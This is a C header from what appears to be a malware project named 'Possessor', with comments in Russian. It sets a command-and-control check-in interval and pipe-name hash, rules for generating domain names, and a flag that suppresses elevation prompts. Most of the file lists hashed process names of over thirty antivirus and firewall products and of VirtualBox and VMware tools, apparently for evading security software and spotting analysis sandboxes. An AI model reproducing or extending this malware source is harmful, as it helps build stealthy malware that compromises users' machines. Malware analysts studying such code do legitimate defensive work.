#ifndef __POSSESSOR_COMMON_H_
#define __POSSESSOR_COMMON_H_

#define POSSESSOR_HASH 0xF9375ACD
#define POSSESSOR_VERSION 0x00000067

#define CONTROLLER_HASH 0x77c303d1 // 0controller hash for pipe naming

#define CONTROLLER_COMMON_REQUEST_TIMEOUT 10 // количество минут между осуществлением основного запроса на контроллер.

#define SUBNAMES_UNIQUE_PERIOD 12 // в часах
#define SUBNAMES_LIST_MAX_LEN 6 // максимальное количество доменов в списке
#define SUBNAME_MIN_SIZE 5 // минимальная длина имени
#define SUBNAME_MAX_SIZE 32 // минимальная длина имени

//#define FIRST_TIME_DELAY 60 // пауза перед первым отстуком на сервер при самом первом запуске в секундах

#define FS_SIZE 3072 * 1048576

#define FOFX_REQUIREELEVATION        0x10000000  // User expects the elevation; don't show a dialog to confirm



#define EKRN_EXE_HASH                0xd90a7896 // ekrn.exe  - ESET service process.
#define CCSVCHST_EXE_HASH            0x7ae72224 // ccSvcHst.exe - Symantec process.
#define SCHED_EXE_HASH               0x185ad196 // sched.exe - Avira Scheduler process.
#define AVP_EXE_HASH                 0x56028094 // avp.exe - Kaspersky Antivirus process.
#define AVASTSVC_EXE_HASH            0xfaab2424 // AvastSvc.exe - avast! Service.
#define MCSVHOST_EXE_HASH            0x3b0f2726 // McSvHost.exe - McAfee Service Host.
#define CMDAGENT_EXE_HASH            0xdb2f0321 // cmdagent.exe - COMODO Internet Security.
#define AVGWDSVC_EXE_HASH            0xba2b2825 // avgwdsvc.exe - AVG Watchdog Service.
#define AVGCSRVX_EXE_HASH            0x7bf31425 // avgcsrvx.exe - AVG Scanning Core Module - Server Part.
#define ACS_EXE_HASH                 0x56325a94 // acs.exe - Agnitum Outpost Service (Virus Buster).
#define DWSERVICE_EXE_HASH           0x3acf0829 // dwservice.exe - Dr.Web Control Service.
#define PFSVC_EXE_HASH               0xd862f098 // pfsvc.exe - Privatefirewall Network Service.
#define MSMPENG_EXE_HASH             0xBAA6DDA3 // Antimalware Service Executable.
#define MSSECES_EXE_HASH             0x3B0ED1A3 // Microsoft Security Client User Interface.
#define ISWSVC_EXE_HASH              0xf8eaf3a5 // ZoneAlarm Browser Security.
#define PCTSSVC_EXE_HASH             0x3a8af4a5 // PC Tools Security Component.
#define JPF_EXE_HASH                 0x95627496 // jpf.exe - Jetico Personal Firewall Control Application.
#define BDAGENT_EXE_HASH             0xDB02D1A1 // bdagent.exe - Bitdefender Agent.
#define ADAWARESERVICE_EXE_HASH      0x23F5290D // AdAwareService.exe - Ad-Aware
#define ARCAMAINSV_EXE_HASH          0x5BF10D2C // ArcaMainSV.exe - ArcaVir
#define PSCTRLS_EXE_HASH             0xFB92CFA6 // PsCtrlS.exe - Panda
#define SAVSERVICE_EXE_HASH          0x0BB507A9 // SavService.exe - Performs virus scanning and disinfection functions.
#define SAVADMINSERVICE_EXE_HASH     0x601F28CE // SAVAdminService.exe - Sophos Admininistrator Service.
#define FSHOSTER32_EXE_HASH          0x27D2A2AE // fshoster32.exe - F-Secure Host Process
#define TPMGMA_EXE_HASH              0x587ADEA4 // tpmgma.exe - TrustPort Antivirus Management Agent
#define NPSVC32_EXE_HASH             0xD78A6DA2 // npsvc32.exe - Privacy Service.
#define INORT_EXE_HASH               0xD9B2E197 // InoRT.exe - eTrust Antivirus.
#define RSMGRSVC_EXE_HASH            0x7A8F20A6 // RsMgrSvc.exe - Rising
#define GUARDXSERVICE_EXE_HASH       0xE41A20EC // guardxservice.exe - GuardX Serivce (IKARUS)
#define SOLOSENT_EXE_HASH            0xDB971922 // SOLOSENT.EXE (Solo)
#define SOLOCFG_EXE_HASH             0xBAB6CCA2 // SOLOCFG.EXE (Solo)
#define TFSERVICE_EXE_HASH           0x3ACEFFAA // PCTool ThreatFire Serivce
#define BULLGUARDBHVSCANNER_EXE_HASH 0x92D2A910 // BullGuardBhvScanner - BullGuard Behavioural Scanner
#define CORESERVICESHELL_EXE_HASH    0xB009BBAE // CoreServiceShell.exe - Trend Micro Anti-Malware Solution Platform
#define K7TSMNGR_EXE_HASH            0x1A670B26 // K7TSMngr.exe - K7TotalSecurity Service Manager
#define SBAMSVC_EXE_HASH             0x1A66E1A5 // SBAMSvc.exe - Anti Malware Serivce.
#define INSSATT_EXE_HASH             0x1B7EEFA2 // GFI LanGuard Attendant Service.


#define VBOXSERVICE_EXE_HASH		 0xEB932629 // VBoxService.exe
#define VBOXTRAY_EXE_HASH			 0x7BBB09A6 // VBoxTray.exe
#define	VMACTHLP_EXE_HASH			 0x3B570AA2 // vmacthlp.exe
#define VMTOOLSD_EXE_HASH			 0x9A6F24A5 // vmtoolsd.exe

#include "..\..\0lib\code\vfs\vfs.h"


char* __stdcall possessor_get_pipe_name(uint32_t hashVal);


#endif // __POSSESSOR_COMMON_H_
